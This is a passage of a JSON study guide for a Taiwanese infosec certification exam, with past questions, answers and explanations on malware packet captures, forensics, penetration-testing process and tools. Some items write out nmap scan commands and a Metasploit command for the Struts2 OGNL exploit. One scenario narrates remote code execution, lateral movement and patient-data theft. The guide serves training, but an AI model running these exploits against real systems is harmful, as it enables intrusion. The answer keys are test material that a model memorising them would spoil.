     "context": "（題組 3）\n小明是公司的資安工程師，早上有同仁通知電腦似乎發生異常，防毒軟體好像也失效，因此小明調閱了公司在網路出口的封包側錄檔案，如下圖，請就上述情境回答下列問題。\n\nSource          Destination     Protocol Length Info\n59.53.91.102    192.168.23.129  TCP   60   [TCP Port numbers reused] 80 → 1065 [SYN, ACK] Seq=1 Ack=1 Win=642…\n192.168.23.129  59.53.91.102    TCP   60   1065 → 80 [ACK] Seq=1 Ack=2 Win=64240 Len=0\n59.53.91.102    192.168.23.129  TCP   60   [TCP Port numbers reused] 80 → 1064 [SYN, ACK] Seq=1 Ack=1 Win=642…\n192.168.23.129  59.53.91.102    TCP   60   1064 → 80 [ACK] Seq=1 Ack=2 Win=64240 Len=0\n192.168.23.129  59.53.91.102    HTTP  314  GET /q.jar HTTP/1.1\n59.53.91.102    192.168.23.129  TCP   60   80 → 1065 [ACK] Seq=2 Ack=261 Win=64240 Len=0\n192.168.23.129  59.53.91.102    HTTP  317  GET /sdfg.jar HTTP/1.1\n59.53.91.102    192.168.23.129  TCP   60   80 → 1064 [ACK] Seq=2 Ack=264 Win=64240 Len=0\n192.168.23.129  192.168.23.2    NBNS  110  Refresh NB TICKLAB<00>\n59.53.91.102    192.168.23.129  TCP   1514 80 → 1065 [ACK] Seq=2 Ack=261 Win=64240 Len=1460 [TCP segment of a…\n59.53.91.102    192.168.23.129  TCP   1514 80 → 1065 [PSH, ACK] Seq=1462 Ack=261 Win=64240 Len=1460 [TCP segm…\n192.168.23.129  59.53.91.102    TCP   60   1065 → 80 [ACK] Seq=261 Ack=2922 Win=64240 Len=0\n192.168.23.129  192.168.23.2    NBNS  110  Refresh NB TICKLAB<00>\n192.168.23.129  192.168.23.2    NBNS  110  Refresh NB TICKLAB<00>\n59.53.91.102    192.168.23.129  TCP   1514 80 → 1064 [ACK] Seq=2 Ack=264 Win=64240 Len=1460 [TCP segment of a…\n59.53.91.102    192.168.23.129  TCP   1514 80 → 1064 [PSH, ACK] Seq=1462 Ack=264 Win=64240 Len=1460 [TCP segm…\n192.168.23.129  59.53.91.102    TCP   60   1064 → 80 [ACK] Seq=264 Ack=2922 Win=64240 Len=0\n59.53.91.102    192.168.23.129  TCP   1514 80 → 1064 [ACK] Seq=2922 Ack=264 Win=64240 Len=1460 [TCP segment o…\n（附圖，封包時間序）\nTime                        Source          Destination     Protocol Length Info\n2010-03-17 00:50:18.363025  59.53.91.102    192.168.23.129  TCP   60   80 → 1061 [SYN, ACK] Seq=0 Ack=1 Win=64240 Len=0 MSS=1460\n2010-03-17 00:50:18.363270  192.168.23.129  59.53.91.102    TCP   60   1061 → 80 [ACK] Seq=1 Ack=1 Win=64240 Len=0\n2010-03-17 00:50:18.364685  192.168.23.129  59.53.91.102    HTTP  517  GET /true.php HTTP/1.1\n2010-03-17 00:50:18.367012  59.53.91.102    192.168.23.129  TCP   60   80 → 1061 [ACK] Seq=1 Ack=464 Win=64240 Len=0\n2010-03-17 00:50:21.268121  59.53.91.102    192.168.23.129  TCP   1514 80 → 1061 [ACK] Seq=1 Ack=464 Win=64240 Len=1460 [TCP segment of…\n2010-03-17 00:50:21.268142  59.53.91.102    192.168.23.129  HTTP  136  HTTP/1.1 200 OK (text/html)\n2010-03-17 00:50:21.280061  192.168.23.129  59.53.91.102    TCP   60   1061 → 80 [ACK] Seq=464 Ack=1543 Win=64240 Len=0\n2010-03-17 00:50:21.306342  192.168.23.129  59.53.91.102    HTTP  364  GET /xxx.xxx HTTP/1.1\n2010-03-17 00:50:21.306361  59.53.91.102    192.168.23.129  TCP   60   80 → 1061 [ACK] Seq=1543 Ack=774 Win=64240 Len=0\n2010-03-17 00:50:21.420447  192.168.23.129  65.55.195.250   TCP   62   1062 → 443 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1\n2010-03-17 00:50:21.502696  65.55.195.250   192.168.23.129  TCP   60   443 → 1062 [SYN, ACK] Seq=0 Ack=1 Win=64240 Len=0 MSS=1460\n2010-03-17 00:50:21.508176  192.168.23.129  65.55.195.250   TCP   60   1062 → 443 [ACK] Seq=1 Ack=1 Win=64240 Len=0\n（附圖，物件清單）\nPacket  Hostname     Content Type                  Size      Filename\n13      nrtjo.eu     text/html                     6278 bytes  true.php\n32      nrtjo.eu     text/plain                    171 bytes   xxx.xxx\n55      nrtjo.eu     text/html                     409 bytes   favicon.ico\n85      nrtjo.eu     application/x-java-archive    7079 bytes  sdfg.jar\n98      nrtjo.eu     application/x-java-archive    5573 bytes  q.jar\n217     nrtjo.eu     application/octet-stream      68 kB       loading.php?spl=javad0\n273     nrtjo.eu     application/octet-stream      68 kB       loading.php?spl=javadnw&J050006010\n295     freeways.in  text/html                     672 bytes   gate.php?guid=ADMINISTRATOR!TICKLABS-LZ!1C7AE7C1&ver=10084&stat=ONLINE&ie=8.0.6001.18702&os=5.1.2600&ut=Admin&cpu=92&cc…",
     "hint": "從 DNS 回應把網域換成 IP，再核對 HTTP GET 的目的位址是誰；注意來源與目的哪一邊是受害者。",
     "explanation": "答案 A。DNS 回應顯示 nrtjo.eu 解析為 59.53.91.102，且受害主機（192.168.23.129）對該 IP 發出 GET /q.jar、GET /sdfg.jar，所以下載惡意程式的網站 IP 是 59.53.91.102。B 192.168.23.129 是受害主機自己；C 65.55.195.250 是另一條 TCP 443 連線的目的 IP，不是下載 .jar 的站台；D 127.0.0.1 是本機迴圈位址。",
     "source": "110-1 第32題"
    }
   ]
  },
  {
   "id": "2.1-09",
   "section": "2.1",
   "title": "數位鑑識與證據保全",
   "examHits": 3,
   "examRefs": [
    "115-2 第23題",
    "115-2 第27題",
    "109-1 第10題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "數位鑑識的原則是：先保全、不破壞、可驗證。證據保全的標準做法是先對原始硬碟計算雜湊值，做位元層級（bit-by-bit）的完整映像複製，再計算複本雜湊確認與原始相符，之後只在複本上做鑑識，原始碟封存。揮發性資料（記憶體）要在關機前採集，但 OT／工控環境要避免影響產線：用離線的輕量採證工具從 USB 執行，並監控 CPU，不要拔電、不要強制觸發當機。若要提告，要優先保存『能直接證明行為經過』的紀錄，例如 AI Agent 事件中的使用者與 AI 的互動紀錄與工具呼叫紀錄，效能監控或防護規則觸發紀錄屬輔助。",
   "keyPoints": [
    "硬碟證據：先對原碟取雜湊 → 位元層級複製 → 對複本取雜湊並比對一致 → 只對複本鑑識；原碟不可直接分析或先加密、不是只複製檔案。",
    "記憶體採證是揮發性資料：拔電或強制當機會損失證據並影響生產；OT 環境用離線 USB 輕量工具並監控負載。",
    "要提告或釐清經過 → 優先保存直接記錄行為的紀錄（互動紀錄、工具呼叫紀錄），其次才是防護規則告警與效能紀錄。",
    "保全時要維持證據保管鏈（誰、何時、做了什麼），並留下可重現的紀錄。",
    "能用複本就不碰原件；能不影響業務就不重啟，必要時才取捨可用性與完整性。"
   ],
   "trap": "直接對原硬碟分析、只複製檔案而非位元層級映像、拔電以為最安全；或把防護告警當成最主要的法律證據而忽略互動與操作紀錄。",
   "quiz": [
    {
     "stem": "某企業導入AI Agent 協助員工查詢內部文件及執行工作流程。某日發現 AI Agent 遭受Prompt Injection 攻擊，導致機敏資訊被存取。資安團隊準備進行事件調查，以釐清攻擊過程及資料外洩範圍。若要提出相關告訴，應優先保存下列哪一項紀錄？",
     "options": [
      "AI模型推論延遲與GPU使用率監控紀錄",
      "同一使用者短時間內多次觸發Prompt Injection防護規則之紀錄",
      "輸入內容安全檢查（Input Guardrail）所產生的策略違規事件紀錄",
      "使用者與AI Agent 的互動紀錄及工具呼叫紀錄"
     ],
     "answer": 3,
     "hint": "逐項判斷：這份紀錄能不能還原攻擊經過並證明資料外洩範圍？",
     "explanation": "答案 D。若要提出相關告訴，要保存能直接證明『誰對 AI Agent 說了什麼、Agent 做了什麼工具呼叫、存取了哪些資料』的紀錄，所以應優先保存使用者與 AI Agent 的互動紀錄及工具呼叫紀錄。A 推論延遲與 GPU 使用率是效能監控，與攻擊過程無直接關聯；B 與 C 是防護機制觸發的告警紀錄，屬輔助資訊，不足以還原完整攻擊過程與資料外洩範圍。",
     "source": "115-2 第23題"
    },
    {
     "stem": "情境如附圖所示。鑑識與應變調查發現，攻擊者已成功控制一台與機械手臂連接HMI（Human-Machine Interface）。該 HMI運行的是嵌入式 Windows 7系統。在不影響生產線即時通訊的前提下，若要進行記憶體採證（Memory Forensics），下列何種做法最能平衡「技術完整性」與「工控可用性」？",
     "options": [
      "使用Velocity 的遠端外掛，直接在不掛載任何代理程式的情況下掃描物理記憶體",
      "立即拔除該HMI的電源，將硬碟取下進行鏡像（Mirroring）採證",
      "直接對該HMI執行Kernel Panic觸發藍屏，以獲取完整的Memory Dump",
      "透過離線專用的取證USB 工具，使用Magnet RAM Capture等輕量化工具提取，並密切監控CPU使用率"
     ],
     "answer": 3,
     "context": "這是一份針對高度機密工廠環境（OT/ICS 與 IT 整合）的技術考題。場景設定在一個半導體晶圓廠的自動化生產線，重點在於網路隔離失效後的應變與威脅狩獵。\n\n考場情境設定：自動化工廠的「影子連線」（Shadow Connection）\n背景：某台灣知名半導體廠的生產執行系統（Manufacturing Execution System，MES），該系統屬於重要製造營運層（Purdue Level 3）。該廠區嚴格執行網段隔離（Network Segmentation），但最近資安監控中心（Security Operations Center，SOC）在防火牆日誌中發現，一部位於「工控機台控制段（Level 2）」的可程式邏輯控制器（PLC）管理工作站，竟然試圖透過非典型的連接埠連向外部不知名的 IP 位址。",
     "hint": "逐項檢查題目的兩個條件：能否保全記憶體內容？會不會影響產線運作？",
     "explanation": "答案 D。HMI 運行嵌入式 Windows 7，不能影響生產線即時通訊，同時又要保有揮發性記憶體證據：透過離線專用的取證 USB 工具，使用 Magnet RAM Capture 等輕量化工具提取，並監控 CPU 使用率，最能平衡技術完整性與工控可用性。A 以遠端外掛不掛代理程式直接掃描物理記憶體，在這種環境並不可行且可能影響系統；B 拔除電源會讓記憶體中的證據消失；C 觸發藍屏會中斷設備運作、影響生產，也可能破壞證據。",
     "source": "115-2 第27題"
    },
    {
     "stem": "當資安外洩事件發生後，若須確保證據的完整性，應對已被入侵的硬碟做下列何項處理？",
     "options": [
      "將原硬碟加密並進行鑑識工作後，再進行雜湊比對",
      "將原硬碟進行雜湊比對、位元層級複製，並對複製後的新硬碟進行雜湊比對，確認與原硬碟相符，對新硬碟進行鑑識工作",
      "在系統安裝一顆新硬碟，複製原硬碟所有檔案到新硬碟，對新硬碟進行鑑識工作",
      "對原硬碟直接進行鑑識工作"
     ],
     "answer": 1,
     "hint": "回想數位鑑識證據保全的原則，逐項判斷每個做法能否確保證據完整性。",
     "explanation": "答案 B。標準做法：先對原硬碟取雜湊、做位元層級複製，再對複製後的新硬碟取雜湊並確認與原硬碟相符，之後只對新硬碟鑑識，確保原始證據完整未被更動。A 將原硬碟加密會改動證據；C 只複製檔案，不含已刪除資料與未配置空間，不是位元層級映像；D 直接對原硬碟鑑識，容易改變證據且無法重現。",
     "source": "109-1 第10題"
    }
   ]
  },
  {
   "id": "2.2-01",
   "section": "2.2",
   "title": "滲透測試流程與範圍",
   "examHits": 17,
   "examRefs": [
    "115-2 第32題",
    "113-2 第28題",
    "113-2 第31題",
    "113-1 第29題",
    "113-1 第33題",
    "112-2 第28題",
    "112-2 第29題",
    "112-1 第32題",
    "112-1 第33題",
    "112-1 第34題",
    "112-1 第35題",
    "112-1 第36題",
    "110-1 第36題",
    "109-1 第14題",
    "109-1 第37題",
    "109-1 第38題",
    "108-1 第20題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "滲透測試是『經授權』模擬攻擊者手法，找出並驗證弱點，但前提是不能傷害正常營運與資料完整性。流程上先做前期溝通（範圍、授權、規則），再做情報收集、威脅建模、漏洞分析、利用、後期利用，最後報告；PTES 七階段順序必須記牢。到 OT／工控環境時，產線不能停，所以以被動監聽識別資產為優先，主動測試只在非生產環境或維護窗口進行，不要對 PLC、SCADA 做高併發主動掃描，也不要在老舊系統強裝新代理程式。紅隊是模擬入侵攻擊，藍隊負責即時偵測與防堵，紫隊是讓紅藍協作、共享攻防成果的合作模式，並不是『書面演練』。",
   "keyPoints": [
    "PTES 順序：前期溝通 → 情報收集 → 威脅建模 → 漏洞分析 → 利用 → 後期利用 → 報告；看到選項要比『相對順序』是否正確。",
    "滲透測試一定要經系統管理者／公司同意與授權；沒有授權的『驗證漏洞』就是攻擊。",
    "OT 環境：優先被動監聽；主動測試只在 Staging 或維護窗口；不對 PLC／SCADA 做高併發主動掃描、不強裝新 EDR 到老舊系統。",
    "紅隊＝模擬攻擊、藍隊＝防禦與回應、紫隊＝紅藍協作與知識分享（可含技術攻防），不是只有書面。",
    "滲透測試目標涵蓋網路裝置、作業系統、實體、應用程式、管理制度，但『實體安全最重要』『應用程式是管理電腦資源的程式』這類說法是錯的。"
   ],
   "trap": "把紫隊當成書面演練、把沒經同意也能做的『驗證』當成滲透測試，或把 OT 環境當一般 IT 環境做主動大量掃描。",
   "quiz": [
    {
     "stem": "針對關鍵基礎設施（OT環境）進行資安健診與滲透測試時，必須考量工業控制系統的特殊性。為了避免測試過程造成產線中斷或設備損壞，下列哪些測試策略是必須嚴格遵守的？",
     "options": [
      "對可程式邏輯控制器（PLC）或數據採集與監控系統（SCADA）執行主動式、高併發的弱點掃描以確保完整性",
      "優先採用被動式流量監聽（Passive Monitoring）來識別資產與漏洞",
      "在非生產環境（Staging）或維修期間（Maintenance Window）進行主動測試",
      "針對老舊系統強行安裝最新的端點偵測與回應（EDR）代理程式以獲取詳細日誌"
     ],
     "answer": [
      1,
      2
     ],
     "hint": "逐項問：這個測試策略會不會造成產線中斷或設備損壞？",
     "explanation": "答案 B、C。OT 環境要避免造成產線中斷：B 優先採用被動式流量監聽，在不干擾設備的前提下識別資產與漏洞；C 主動測試只在非生產環境（Staging）或維修期間進行。A 對 PLC 或 SCADA 做主動、高併發的弱點掃描，可能使控制器當機，是應避免的；D 對老舊系統強行安裝最新 EDR 代理程式，可能造成相容或效能問題而影響營運，也不適當。",
     "source": "115-2 第32題"
    },
    {
     "stem": "網路安全滲透測試的目標包括一切與網路相關的基礎設施，包含網路裝置、作業系統、實體安全、應用程式、管理制度等。下列敘述哪些錯誤？",
     "options": [
      "網路裝置是包含所有能夠連接到網路的各種實體，像是路由器、交換機、防火牆、個人電腦等",
      "實體安全主要指的是機房環境、通訊設備等，是資訊安全中最重要的目標",
      "應用程式是管理與控制電腦軟硬體資源的電腦程式",
      "管理制度指的是為了保障網路安全對使用者提出的要求與限制"
     ],
     "answer": [
      1,
      2
     ],
     "hint": "回想滲透測試各類目標的定義，逐項判斷每句描述是否正確。",
     "explanation": "答案 B、C（錯誤的敘述）。B 把實體安全說成『資訊安全中最重要的目標』，過度誇大，滲透測試的目標是多面向的；C 『管理與控制電腦軟硬體資源的電腦程式』是作業系統的定義，不是應用程式。A 網路裝置包含能連網的各種實體（路由器、交換機、防火牆、個人電腦等）、D 管理制度指為保障網路安全而對使用者提出的要求與限制，官方視為正確敘述，因此不選。",
     "source": "113-2 第28題"
    },
    {
     "stem": "如附圖所示，關於 PTES（Penetration Testing Execution Standard）流程項目的排序，下列何者正確？",
     "options": [
      "漏洞分析 > 威脅建模 > 情報收集 > 報告",
      "情報收集 > 漏洞分析 > 威脅建模 > 報告",
      "前期溝通 > 情報收集 > 漏洞分析 > 報告",
      "威脅建模 > 前期溝通 > 情報收集 > 漏洞分析"
     ],
     "answer": 2,
     "context": "1. 漏洞分析（Vulnerability Analysis）\n2. 威脅建模（Threat Modeling）\n3. 報告（Reporting）\n4. 後期利用（Post Exploitation）\n5. 利用（Exploitation）\n6. 情報收集（Intelligence Gathering）\n7. 前期溝通（Pre-engagement Interactions）",
     "hint": "把七個階段從頭到尾排好，再逐一檢查選項裡任兩項的前後關係是否與正確順序一致。",
     "explanation": "答案 C。PTES 的順序為：前期溝通（Pre-engagement Interactions）→ 情報收集 → 威脅建模 → 漏洞分析 → 利用 → 後期利用 → 報告。C『前期溝通 > 情報收集 > 漏洞分析 > 報告』的相對順序正確。A 漏洞分析排在情報收集之前，錯；B 漏洞分析排在威脅建模之前，錯（威脅建模在漏洞分析前）；D 威脅建模排在前期溝通之前，錯。",
     "source": "113-2 第31題"
    },
    {
     "stem": "關於滲透測試的敘述，下列何者錯誤？",
     "options": [
      "模擬駭客手法，在不需要系統管理者或公司同意下，進行漏洞驗證",
      "模擬駭客手法或惡意使用者的行為，試圖找出和利用系統的弱點",
      "滲透測試要確保不會影響正常的業務運作和資料的完整性",
      "滲透測試（Penetration Testing，簡稱 Pen Testing）是一種安全測試方法"
     ],
     "answer": 0,
     "hint": "回想滲透測試的定義與執行前提，逐項判斷每句是否正確。",
     "explanation": "答案 A（錯誤的敘述）。滲透測試必須經過系統管理者或公司的同意與授權，並明定範圍與規則；在不需同意下進行漏洞驗證屬於未經授權的攻擊行為。B 模擬駭客手法找出並利用弱點、C 要確保不影響正常營運與資料完整性、D 定義為安全測試方法，皆為正確敘述。",
     "source": "113-1 第29題"
    },
    {
     "stem": "情境如附圖所示，有關紅隊、藍隊與紫隊的敘述，下列何者錯誤？",
     "options": [
      "紅隊演練（Red Team Assessment）在不影響企業營運下，進行模擬入侵攻擊",
      "藍隊演練（Blue Team Assessment），指的是企業內部的工程部門或資安人員，當紅隊發動攻擊時，藍隊要在第一時間反應，快速防堵漏洞，將傷害降至最低",
      "紫隊演練（Purple Team Assessment）為書面演練形式，無法進行技術攻防，目的就是讓負責演練的紅隊和藍隊能站在同一陣線",
      "紅隊演練（Red Team Assessment）在有限的時間內從各種進入點執行攻擊，嘗試達成企業指定的測試任務"
     ],
     "answer": 2,
     "context": "某企業集團希望徵求紅隊演練測試，來驗證公司內部 IT 資安防護能力，可是又擔心執行過程中讓公司內部 IT 或資安部門無法獲得溝通學習成長，身為該公司重要外部資安顧問專家。",
     "hint": "回想紅隊、藍隊、紫隊演練的定義，逐項判斷每句是否正確。",
     "explanation": "答案 C（錯誤的敘述）。紫隊演練是讓紅隊與藍隊協作、共享攻擊手法與偵測防禦成果的合作方式，並非只能書面演練、無法進行技術攻防，所以 C 錯。A 紅隊在不影響營運下模擬入侵攻擊；B 藍隊是企業內部工程或資安人員，在紅隊攻擊時第一時間反應防堵；D 紅隊在有限時間內從各種進入點達成指定任務，皆正確。",
     "source": "113-1 第33題"
    }
   ]
  },
  {
   "id": "2.2-02",
   "section": "2.2",
   "title": "滲透測試工具與指令",
   "examHits": 15,
   "examRefs": [
    "114-2 第7題",
    "114-2 第8題",
    "114-2 第38題",
    "113-2 第29題",
    "113-2 第30題",
    "113-1 第24題",
    "113-1 第32題",
    "111-1 第1題",
    "110-1 第14題",
    "110-1 第33題",
    "110-1 第37題",
    "110-1 第38題",
    "110-1 第39題",
    "110-1 第40題",
    "109-1 第25題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "滲透測試的工具要用對地方：Nmap 做埠掃描與服務版本偵測（-sV 偵測版本、-p 指定埠、-O 偵測作業系統、--script 跑腳本）；Burp Suite、OWASP ZAP 是 Web 攔截代理，用來攔截與修改 HTTP 請求做注入測試；Metasploit 是漏洞利用與測試框架；Wireshark 抓封包；John the Ripper、Hashcat 破解雜湊；Aircrack-ng、Kismet 用於無線網路；sqlmap 專攻 SQL 注入；Nikto 是網站伺服器掃描。遇到情境題，先分辨『是要偵測、驗證還是利用』：像 Apache Struts 2 的 OGNL 漏洞，要在內網快速驗證漏洞，可以在 Metasploit 載入對應模組（如 struts2_content_type_ognl）；掃資料庫 3306 埠的版本，就是 nmap -sV -p 3306（可再加 mysql-info 腳本）。",
   "keyPoints": [
    "nmap 指令對照：-sV 服務版本、-O 作業系統、-sS SYN 掃描、-p 指定埠、-T5 只調整掃描速度（最快），本身不做版本偵測、--script 跑 NSE 腳本（如 mysql-info）。",
    "要攔截並修改 Web 請求、做注入測試 → Burp Suite（或 ZAP）；SonarQube 是原始碼分析、Qualys 是弱點掃描平台、Nmap 是埠掃描。",
    "Metasploit 的用途是漏洞利用與測試；Struts 2 OGNL 的 Metasploit 模組路徑為 exploit/multi/http/struts2_content_type_ognl。",
    "工具分類：Nmap 用於識別設備、開放埠與服務；Wireshark 為封包分析；John／Hashcat 破解密碼雜湊；Aircrack-ng／Kismet 屬無線網路。",
    "看到工具題先問用途屬於哪一類（掃描、代理、利用、破解、無線、封包），再看選項裡的指令參數效果。"
   ],
   "trap": "把 nmap -sS -T5 當成能顯示服務版本、把 John／Hashcat 說成社交工程工具、把 Aircrack-ng 說成有線網路工具，或把 Burp／ZAP 說成作業系統漏洞分析工具。",
   "quiz": [
    {
     "stem": "情境如附圖所示。醫院若想針對內網環境進行上述 Struts 2 漏洞的快速偵測並驗證，使用下列何種工具或指令最為適切？",
     "options": [
      "nmap -sV --script=http-shellshock",
      "sqlmap -u \"https://struts2.com\"",
      "nikto -host struts2.com -C all",
      "msf > use exploit/multi/http/struts2_content_type_ognl"
     ],
     "answer": 3,
     "context": "某醫療資訊系統採用 Apache Struts 2 作為開發框架，且版本未及時更新。該醫院在做紅隊演練時，施測人員發現可透過特定 HTTP 請求，於 HTTP Header 中對醫療資訊系統插入惡意 OGNL（Object Graph Navigation Language）語法，成功在系統上遠端執行任意指令（RCE），取得 Shell 權限。施測人員進一步利用此權限，在內網大量掃描，並且進行橫向移動（Lateral Movement），最終施測人員找到資料庫的伺服器，並且以預設帳號密碼登入，竊取大量病患的醫療資料，若這個漏洞被攻擊者利用，將會造成嚴重的機密資料外洩事件。",
     "hint": "先確認題目的漏洞類型（遠端程式碼執行、OGNL）再對照每個工具專攻的漏洞類型，選擇能直接針對該漏洞做驗證的。",
     "explanation": "答案 D。要快速偵測並驗證內網主機是否存在 Struts 2 OGNL 漏洞，使用 Metasploit 載入對應模組 exploit/multi/http/struts2_content_type_ognl 最為適切。A nmap 的 http-shellshock 腳本偵測的是 Bash Shellshock，不是 Struts 2；B sqlmap 專門測試 SQL 注入；C nikto 是通用網站伺服器弱點掃描，並非針對 OGNL 驗證的工具。",
     "source": "114-2 第7題"
    },
    {
     "stem": "情境如附圖所示。攻擊者取得 RCE 後，使用下列哪些 nmap 指令（指令中的 target 請視為要掃描的系統）可以用來掃描 3306 埠，並且可以顯示資料庫服務的版本？",
     "options": [
      "nmap -sV -p 3306 target",
      "nmap -O -p 1-65535 target",
      "nmap -sS -T5 target",
      "nmap -sV -p 3306 --script mysql-info target"
     ],
     "answer": [
      0,
      3
     ],
     "context": "某醫療資訊系統採用 Apache Struts 2 作為開發框架，且版本未及時更新。該醫院在做紅隊演練時，施測人員發現可透過特定 HTTP 請求，於 HTTP Header 中對醫療資訊系統插入惡意 OGNL（Object Graph Navigation Language）語法，成功在系統上遠端執行任意指令（RCE），取得 Shell 權限。施測人員進一步利用此權限，在內網大量掃描，並且進行橫向移動（Lateral Movement），最終施測人員找到資料庫的伺服器，並且以預設帳號密碼登入，竊取大量病患的醫療資料，若這個漏洞被攻擊者利用，將會造成嚴重的機密資料外洩事件。",
     "hint": "把每個指令拆成『掃描範圍』與『偵測內容』兩部分，看哪些同時涵蓋 3306 埠與服務版本的偵測。",
     "explanation": "答案 A、D。要掃描 3306 埠並顯示資料庫服務版本：A nmap -sV -p 3306 target 以 -sV 偵測 3306 埠的服務版本；D 再加上 --script mysql-info 取得更詳細的 MySQL 資訊，同樣可顯示版本。B -O 是作業系統偵測，且掃全部 1 至 65535 埠，並不是顯示 3306 服務版本；C -sS -T5 只是 SYN 掃描並加快速度，沒有版本偵測參數，不會顯示服務版本。",
     "source": "114-2 第8題"
    },
    {
     "stem": "情境如附圖所示。你負責進行 ERP-Web 的 Web 弱點滲透測試，需選擇具備攔截與注入模擬功能的工具。請問下列何項工具最適合？",
     "options": [
      "SonarQube",
      "Burp Suite",
      "Qualys",
      "Nmap"
     ],
     "answer": 1,
     "context": "你受聘為「超好用科技股份有限公司」的資安顧問，協助執行其年度資訊安全強化計畫。該公司目前正導入 DevSecOps 實踐，並預定完成以下三項目標：\n1. 對旗下新開發的 ERP-Web 系統執行全面「原始碼檢測」與「滲透測試」；\n2. 執行一次針對雲端主機與內部網段的「資安健診」作業；\n3. 建立跨部門的風險評估與弱點修補作業流程，以提升資安治理成熟度。\n\n在測試與健診過程中，團隊發現若干高風險弱點與不當配置，例如：缺乏原始碼檢測、程式碼包含敏感資訊、驗證缺陷等。你需依據檢測結果，提出分析報告、優先順序、工具選用建議，以及內部控制對策，並向董事會報告成果。",
     "hint": "逐項回想每個工具的主要功能，判斷哪一個具備題目要求的攔截與注入模擬能力。",
     "explanation": "答案 B。需要『攔截與注入模擬』的 Web 弱點滲透測試工具是 Burp Suite（攔截代理，可修改請求做注入、驗證測試）。A SonarQube 為原始碼品質與靜態分析；C Qualys 是弱點掃描平台，不以攔截代理為主；D Nmap 是網路埠與服務掃描，不具攔截請求的功能。",
     "source": "114-2 第38題"
    },
    {
     "stem": "關於滲透測試工具的敘述，下列何者正確？",
     "options": [
      "John the Ripper 和 Hashcat，主要用在社交工程",
      "Aircrack-ng 和 Kismet 用在有線網路刺探分析",
      "Nmap 和 Wireshark 用於識別網路中的設備，以及他們開放的端口和服務",
      "OWASP ZAP 和 Burp Suite 用在作業系統漏洞分析"
     ],
     "answer": 2,
     "hint": "逐項回想每對工具的主要用途，判斷描述是否正確。",
     "explanation": "答案 C。Nmap 與 Wireshark 用來識別網路中的設備、開放的埠與服務（Wireshark 以封包分析輔助）。A John the Ripper 與 Hashcat 用於密碼雜湊破解，不是社交工程；B Aircrack-ng 與 Kismet 用於無線網路，不是有線網路刺探；D OWASP ZAP 與 Burp Suite 是 Web 應用程式測試工具，不是作業系統漏洞分析。",
     "source": "113-2 第29題"
    },
    {
     "stem": "Metasploit 框架最主要是用於下列何種情境？",
     "options": [
      "防火牆配置",
      "網路封包分析",
      "漏洞利用和測試",
      "垃圾郵件過濾"
     ],
     "answer": 2,
     "hint": "逐項回想每個情境常用的工具，判斷哪一個是 Metasploit 的主要用途。",
     "explanation": "答案 C。Metasploit 框架主要用於漏洞利用與測試（含 Exploit 模組、Payload、輔助模組）。A 防火牆配置、B 網路封包分析（常用 Wireshark）、D 垃圾郵件過濾，都不是它的主要用途。",
     "source": "113-2 第30題"
    }
   ]
  },
  {
   "id": "2.2-03",
   "section": "2.2",
   "title": "弱掃、源碼與滲透定位",
   "examHits": 12,
   "examRefs": [
    "115-1 第31題",
    "115-1 第32題",
    "114-2 第30題",
    "114-2 第31題",
    "112-2 第33題",
    "112-2 第34題",
    "112-1 第6題",
    "111-1 第10題",
    "110-1 第15題",
    "110-1 第35題",
    "109-1 第17題",
    "109-1 第24題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "弱點掃描、源碼檢測、滲透測試、資安健診不是互相取代，而是各看不同層次：源碼檢測（靜態）在不實際攻擊系統的情況下找設計與實作缺陷，數量最多、誤報也較多；弱點掃描快速找已知弱點；滲透測試模擬攻擊者驗證弱點能否真的被利用，誤判最低，也能找出商業邏輯問題；資安健診偏向組織整體防護機制與管理流程的檢視。實務上最好的做法是：先威脅建模，再結合源碼檢測結果，把高風險模組作為人工滲透測試的優先目標；自動化工具只能找常見問題，對客製化商務邏輯了解有限，誤報也多，所以要人工驗證與複測。檢測也要隨系統更新持續做，不是一年做一次就好。",
   "keyPoints": [
    "看到『提升覆蓋率與準確度』→ 威脅建模＋源碼檢測結果引導人工滲透，高風險模組優先；絕對不是『只靠自動化』或『只做其中一種』。",
    "各自定位：滲透測試＝驗證弱點能否被實際利用；源碼檢測＝不攻擊系統而檢視設計與實作缺陷；資安健診＝組織整體防護與管理的檢視。三者互補，不能互相取代。",
    "自動化工具侷限：能檢出常見問題、但客製化商務邏輯了解有限且誤報多；仍需人工驗證與複測。",
    "三者比較：發現數量常以源碼檢測最高、滲透測試誤判率最低、商業邏輯問題要靠滲透測試與人工分析。",
    "檢測要依系統變更頻率持續進行（有版本更新就要重新檢測），而不是固定一年一次。"
   ],
   "trap": "以為工具掃描可以取代人工驗證、以為有源碼檢測就不用滲透測試，或把『滲透測試誤判率最高』『源碼檢測能找商業邏輯』當成事實。",
   "quiz": [
    {
     "stem": "下列何項做法，最能有效提升滲透測試及源碼檢測的整體覆蓋率與準確度？",
     "options": [
      "依賴自動化掃描工具（例如Nessus、Burp Suite 自動掃描、自動分析），完全不進行人工驗證或複測",
      "在滲透測試前進行 Threat Modeling（威脅建模），再結合源碼檢測的結果，將高風險模組作為人工滲透測試的優先目標",
      "每年只做一次資安健診，不管系統更新與程式版本是否有變動",
      "做滲透測試即可，源碼檢測與資安健診會造成資源浪費"
     ],
     "answer": 1,
     "hint": "逐項判斷：這個做法能否同時提升測試的覆蓋率與準確度？",
     "explanation": "答案 B。在滲透測試前做威脅建模、再結合源碼檢測結果，把高風險模組列為人工滲透測試的優先目標，能同時提升覆蓋率與準確度。A 完全依賴自動化掃描、不做人工驗證或複測，誤報與漏報都會增加；C 每年只做一次健診而不管系統更新，無法涵蓋變更後的風險；D 認為只做滲透測試即可，忽略不同檢測方式互補。",
     "source": "115-1 第31題"
    },
    {
     "stem": "某組織為提升整體資訊安全水準，規劃針對其對外服務系統進行安全檢測。該系統包含自行開發的應用程式，並整合多項第三方元件，同時已正式上線並提供實際服務。管理階層希望透過不同安全測試方式，從設計缺陷、根據上述情境，下列哪些說法最符合滲透測試、源碼檢測與資安健診在實務上的正確定位與整合應用方式？（複選）",
     "options": [
      "滲透測試可模擬攻擊者實際入侵行為，用以驗證弱點是否能在真實環境中被成功利用",
      "資安健診著重於組織整體防護機制與管理流程，屬於策略與制度層級的安全檢視",
      "源碼測試可在不實際攻擊系統的情況下，檢視應用程式設計與實作上的潛在安全缺陷",
      "只要完成源碼測試，即可取代滲透測試與資安健診的必要性"
     ],
